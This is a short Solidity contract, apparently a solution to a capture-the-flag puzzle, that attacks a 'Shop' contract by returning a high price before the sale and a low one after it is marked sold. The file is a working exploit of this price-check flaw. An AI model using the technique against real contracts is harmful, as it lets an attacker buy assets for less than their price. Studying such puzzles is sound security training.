// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract ShopAttack {
    Shop shop;

    constructor(address _shopAddr) {
        shop = Shop(_shopAddr);
    }

    function baitAndSwitch() external {
        shop.buy();
    }

    function price() external view returns (uint256 _price) {
        _price = shop.isSold() ? 1 : 100;
    }
}
